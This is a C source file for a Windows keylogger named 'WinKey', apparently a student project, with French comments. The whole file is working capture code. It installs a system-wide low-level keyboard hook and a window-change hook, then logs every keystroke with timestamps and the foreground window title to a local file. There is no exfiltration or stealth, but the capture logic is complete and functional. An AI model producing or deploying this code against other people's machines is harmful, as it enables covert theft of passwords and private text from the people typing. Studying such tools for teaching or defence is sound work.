/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: marvin <marvin@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/09/22 08:32:59 by marvin            #+#    #+#             */
/*   Updated: 2025/09/22 08:32:59 by marvin           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "winkey.h"

t_winkey g_winkey;

void getUtf8Char(int vkCode, char *buffer, size_t bufferSize) {
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    BYTE keyState[256] = {0};
    WCHAR unicodeChar[2] = {0};
    int result = ToUnicode(vkCode, scanCode, keyState, unicodeChar, 2, 0);
    
    if (result > 0) {
        int utf8Length = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, buffer, bufferSize - 1, NULL, NULL);
        buffer[utf8Length] = '\0';
    } else {
        snprintf(buffer, bufferSize, "[VK_%02X]", vkCode);
    }
}

void getCurrentWindowTitle(char *title, size_t size) {
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        GetWindowTextA(hwnd, title, size);
    } else {
        strcpy(title, "Unknown Window");
    }
}

void flushLogFile() {
    if (g_winkey.keylog) {
        fflush(g_winkey.keylog);
    }
}

void logWindowChange() {
    if (g_winkey.keylog) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timestamp[64];
        snprintf(timestamp, sizeof(timestamp), "%04d-%02d-%02d %02d:%02d:%02d",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        
        fprintf(g_winkey.keylog, "\n--- Window Change at %s ---\n", timestamp);
        fprintf(g_winkey.keylog, "Previous: %s\n", g_winkey.window_prev);
        fprintf(g_winkey.keylog, "Current: %s\n", g_winkey.window_title);
        fprintf(g_winkey.keylog, "--- End Window Change ---\n\n");
        flushLogFile();
    }
}

void sendKeyToLogFile(int vkCode) {
    if (g_winkey.keylog) {
        char buffer[128];
        getUtf8Char(vkCode, buffer, sizeof(buffer));
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timestamp[64];
        snprintf(timestamp, sizeof(timestamp), "%04d-%02d-%02d %02d:%02d:%02d",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        
        fprintf(g_winkey.keylog, "Time: %s, Window: %s, Key: %s\n", 
                timestamp, g_winkey.window_title, buffer);
        
        // Flush après chaque touches pour s'assurer que le buffer est vidé
        flushLogFile();
    }
}

VOID CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event,
                          HWND hwnd, LONG idObject, LONG idChild,
                          DWORD dwEventThread, DWORD dwmsEventTime) {
    if (event == EVENT_SYSTEM_FOREGROUND) {
        // Sauvegarder l'ancien titre
        strcpy(g_winkey.window_prev, g_winkey.window_title);
        
        // Obtenir le nouveau titre
        getCurrentWindowTitle(g_winkey.window_title, WINDOW_TITLE_SIZE);
        
        // Logger le changement de fenêtre si c'est différent
        if (strcmp(g_winkey.window_prev, g_winkey.window_title) != 0) {
            logWindowChange();
        }
    }
}

LRESULT CALLBACK keyhook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            sendKeyToLogFile(kbd->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(int argc, char **argv) {
    MSG msg;
    
    // Initialiser la structure
    memset(&g_winkey, 0, sizeof(t_winkey));
    
    // Ouvrir le fichier de log
    g_winkey.keylog = fopen(KEYLOG_FILE, "a");
    if (!g_winkey.keylog) {
        fprintf(stderr, "Erreur: Impossible d'ouvrir le fichier de log!\n");
        return 1;
    }
    
    // Obtenir le titre de la fenêtre actuelle
    getCurrentWindowTitle(g_winkey.window_title, WINDOW_TITLE_SIZE);
    strcpy(g_winkey.window_prev, "Initial");
    
    // Logger le démarrage
    SYSTEMTIME st;
    GetLocalTime(&st);
    char timestamp[64];
    snprintf(timestamp, sizeof(timestamp), "%04d-%02d-%02d %02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    fprintf(g_winkey.keylog, "\n=== WinKey Started at %s ===\n", timestamp);
    fprintf(g_winkey.keylog, "Initial Window: %s\n\n", g_winkey.window_title);
    flushLogFile();
    
    // Installer le hook pour le clavier
    g_winkey.keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyhook_proc, GetModuleHandle(NULL), 0);
    if (!g_winkey.keyboard_hook) {
        fprintf(stderr, "Erreur: Impossible d'installer le hook clavier!\n");
        fclose(g_winkey.keylog);
        return 1;
    }
    
    // Installer le hook pour les changements de fenêtre
    g_winkey.window_hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
                                          NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
    if (!g_winkey.window_hook) {
        fprintf(stderr, "Erreur: Impossible d'installer le hook fenêtre!\n");
        UnhookWindowsHookEx(g_winkey.keyboard_hook);
        fclose(g_winkey.keylog);
        return 1;
    }
    
    printf("WinKey démarré. Appuyez sur Ctrl+C pour arrêter.\n");
    
    // Boucle de messages
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Nettoyage
    if (g_winkey.keyboard_hook) {
        UnhookWindowsHookEx(g_winkey.keyboard_hook);
    }
    if (g_winkey.window_hook) {
        UnhookWinEvent(g_winkey.window_hook);
    }
    if (g_winkey.keylog) {
        fprintf(g_winkey.keylog, "\n=== WinKey Stopped ===\n\n");
        fclose(g_winkey.keylog);
    }
    
    return 0;
}